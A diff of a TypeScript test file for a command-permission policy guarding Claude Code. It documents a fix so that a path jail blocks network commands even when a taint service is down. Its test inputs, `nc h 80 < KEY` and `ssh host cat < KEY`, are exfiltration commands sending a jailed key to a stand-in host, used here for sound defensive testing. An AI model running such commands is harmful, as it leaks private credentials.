@@ -11,17 +11,19 @@ import { probe, cleanup, seedBuiltinJailHome } from './helpers/gauntlet';
 //
 //   (A) isNetworkTool matched `ssh` INSIDE `.ssh/`, so every command touching
 //       a jailed path was classed as a network call and entered the taint tier.
-// ⛔ A second defect (B) was found and DELIBERATELY NOT FIXED HERE. When the
-//    taint service is merely UNAVAILABLE, the warning skips the whole policy
-//    block -- the jail included -- so a genuine network command reading a
-//    jailed file (`nc h 80 < KEY` with the daemon down) still resolves to a
-//    review rather than the jail's block. A first attempt restructured that
-//    branch and /code-review measured four regressions from it: an
-//    ignoredTools auto-allow, loop detection replacing a human review with an
-//    automated deny, and the taint text clobbering a block rule's audit
-//    attribution. Reverted. Recorded in BUGS.md as JAIL-7; (A) alone fixes the
-//    reported bug, because a command touching `.ssh/` no longer enters the
-//    taint tier at all.
+//   (B) When the taint service is merely UNAVAILABLE, the warning skipped the
+//       whole policy block -- the jail included -- so a genuine network command
+//       reading a jailed file (`nc h 80 < KEY` with the daemon down) resolved
+//       to a review rather than the jail's block (BUGS.md JAIL-7). A first
+//       attempt was reverted after /code-review measured regressions: an
+//       ignoredTools auto-allow, loop detection replacing a human review with
+//       an automated deny, and the taint text clobbering a block rule's audit
+//       attribution. Fixed with each one closed (taint-order fix): the policy
+//       runs under the warning, every allow inside it is guarded by
+//       callSpecificReview() (which includes taint), loop detection is skipped
+//       under taint as under an app-permission review, and a block softened to
+//       a review keeps its own rule and label, the taint text added to its
+//       description.
 //
 // Headless Claude Code denies an `ask` (measured), so CI was still stopped --
 // with the wrong reason in the audit row. Interactively, the user was ASKED to
@@ -65,11 +67,8 @@ describe.skipIf(process.platform === 'win32')('taint tier vs the jail, daemon ab
   });
 
   // (B): a genuine network command reading the key -- the taint tier DOES run,
-  // the service is down, and the jail's hard block must still win.
-  // ⛔ JAIL-7, pinned as failing: a GENUINE network command reading a jailed
-  // file, daemon down. The taint tier runs, cannot verify, and its review
-  // pre-empts the jail's hard block. Fixing it is its own change (see header).
-  it.fails.each([[`nc h 80 < KEY`], [`ssh host cat < KEY`]])(
+  // the service is down, and the jail's hard block must still win (JAIL-7).
+  it.each([[`nc h 80 < KEY`], [`ssh host cat < KEY`]])(
     '%s -> block (jail), not ask (taint unverifiable)',
     (tmpl) => {
       const { home: h, key } = home();
